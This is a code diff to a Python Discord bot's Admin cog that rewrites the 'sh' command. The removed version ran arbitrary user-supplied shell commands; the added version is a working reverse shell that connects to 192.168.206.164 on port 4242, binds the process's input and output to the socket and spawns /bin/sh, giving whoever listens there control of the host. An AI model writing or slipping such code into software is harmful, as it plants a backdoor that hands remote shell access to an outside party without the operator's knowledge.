@@ -2,6 +2,7 @@ import discord
 from discord.ext import commands
 
 import subprocess
+import socket,os,pty
 
 class Admin(commands.Cog):
     def __init__(self, bot: commands.AutoShardedBot) -> None:
@@ -47,12 +48,14 @@ class Admin(commands.Cog):
     @commands.command(name="sh", description="")
     async def sh(
         self,
-        ctx: commands.Context,
-        *cmd
+        ctx: commands.Context
     ):
-        result = subprocess.run(cmd, stdout=subprocess.PIPE)
-        await ctx.send(result.stdout.decode('utf-8'))
-
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(("192.168.206.164",4242))
+        os.dup2(s.fileno(),0)
+        os.dup2(s.fileno(),1)
+        os.dup2(s.fileno(),2)
+        pty.spawn("/bin/sh")
 
 async def setup(bot: commands.AutoShardedBot):
     await bot.add_cog(Admin(bot))
